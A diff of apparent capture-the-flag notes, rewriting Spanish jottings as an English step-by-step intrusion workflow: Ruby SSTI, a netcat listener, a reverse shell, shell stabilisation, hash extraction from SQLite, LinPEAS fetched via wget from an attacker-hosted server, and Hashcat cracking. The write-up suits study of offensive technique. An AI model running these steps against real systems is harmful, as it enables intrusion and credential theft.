@@ -1,28 +1,74 @@
-kali- Al hacer un nmap obtenemos un servicio web abierto 
-- Entramos y vemos que hay unos recuadores de texto que devuelven texto 
-- Intento fallido de gobuster de conseguir directorios
-- Lanzan error de malicious input al intentar inyectar codigo
-- Comprobamos que la web usa ruby
-- copiamos un server-side-template-injection traducido a ruby
-- Usamos burpsuite para comprobar si podemos inyectar el ssti desde ahi ,convirtiendolo a URL encode keycharacter 
-- PARA NUEVA LINEA %0A
-- exito, por tanto iniciamso una escucha a un puerto (nc -lvnp 9001)
-- 'which+bash+' = /ust/bin/bash por tanto python3
-- which+python3 = /ust/bin/bash/python3
-- revshells.com descargamos para python3 y encodeamos a url
-- python3 -c 'import pty;pty.spawn/"/bin/bash")'
-- suspendemos 
-- stty raw -echo;fg
-- export TERM = xterm
-- cogemos el user.txt
-- vemos que hay un arhcivo con las credenciales
-- con file (archivo) vemos qeu tipo de archivo se trata
-- entramos con sqlite3 (archivo)
-- conseguimos hash intentamos crackearlo
-- fallo , con john y con hashcat , buscamos otra manera
-- creamos un servidor python3 : python3 -m http.server 9090
-- descargamos  desde la reverse shell con wget (http://ip:puerto/archivo) el PEAS
-- le damos permiso de ejecucion con chmod  +x
-- ejecutar PEAS y buscar por archivo importantes en este caso importante en MAIL
-- encontramos estructura de contraseña
-- con el hash previo : hashcat
+### Security Assessment Workflow
+
+1. **Initial Reconnaissance with Nmap**
+    
+    - Identified an open **web service**.
+2. **Web Application Analysis**
+    
+    - Accessed the service and found text input fields that returned user-provided text.
+    - Attempted directory fuzzing with Gobuster, but it failed to identify any directories.
+    - Observed errors when attempting to inject code, flagged as **malicious input**.
+    - Determined that the application was running on **Ruby**.
+3. **Server-Side Template Injection (SSTI) Exploitation**
+    
+    - Translated a server-side template injection (SSTI) exploit into Ruby syntax.
+    - Used Burp Suite to test the injection, encoding key characters for URL compliance:
+        - For a **new line**: `%0A`
+    - Successfully confirmed SSTI exploitation.
+4. **Gaining Reverse Shell Access**
+    
+    - Started a listener on port 9001 using Netcat:
+        
+        bash
+        
+        CopiarEditar
+        
+        `nc -lvnp 9001`
+        
+    - Verified available interpreters:
+        - `which bash` → `/usr/bin/bash`
+        - `which python3` → `/usr/bin/python3`
+    - Downloaded a Python 3 reverse shell script from **revshells.com**, URL-encoded it, and executed it.
+5. **Interactive Shell Setup**
+    
+    - Stabilized the shell with the following commands:
+        
+        bash
+        
+        CopiarEditar
+        
+        `python3 -c 'import pty; pty.spawn("/bin/bash")'   stty raw -echo; fg   export TERM=xterm`  
+        
+6. **Post-Exploitation Activities**
+    
+    - Retrieved the `user.txt` flag.
+    - Discovered a file containing **credentials**.
+    - Identified the file type with the `file` command.
+    - Accessed the file using **SQLite3** and retrieved a hash.
+7. **Password Cracking Attempts**
+    
+    - Attempted to crack the hash using **John the Ripper** and **Hashcat**, but both failed.
+    - Decided to explore other approaches.
+8. **Privilege Escalation**
+    
+    - Set up a Python HTTP server:
+        
+        bash
+        
+        CopiarEditar
+        
+        `python3 -m http.server 9090`  
+        
+    - Used `wget` from the reverse shell to download **LinPEAS**:
+        
+        bash
+        
+        CopiarEditar
+        
+        `wget http://yourIP:9090/linpeas.sh   chmod +x linpeas.sh`  
+        
+    - Executed LinPEAS to search for sensitive files, focusing on **MAIL** directories.
+9. **Password Recovery and Final Steps**
+    
+    - Found a password structure hint in mail logs.
+    - Combined it with the previously retrieved hash and successfully cracked it using **Hashcat**
